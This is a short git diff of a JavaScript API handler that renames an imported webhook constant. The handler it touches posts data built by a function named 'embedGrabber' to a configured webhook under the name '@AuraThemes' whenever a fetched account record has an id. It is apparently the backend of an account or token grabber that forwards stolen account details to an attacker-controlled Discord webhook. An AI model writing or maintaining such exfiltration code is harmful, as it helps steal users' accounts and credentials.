@@ -1,4 +1,4 @@
-import { webhook as WEBHOOK } from '../../../../k4itrun.config';
+import { webhook } from '../../../../k4itrun.config';
 import fetch from 'sync-fetch';
 import axios from 'axios';
 
@@ -28,7 +28,7 @@ export default async function handler(req, res) {
     })
 
     if (info?.id) {
-      await axios.post(WEBHOOK, {
+      await axios.post(webhook, {
         username: '@AuraThemes',
         avatar_url: 'https://i.imgur.com/WkKXZSl.gif',
         embeds: [embedGrabber(info, data)],
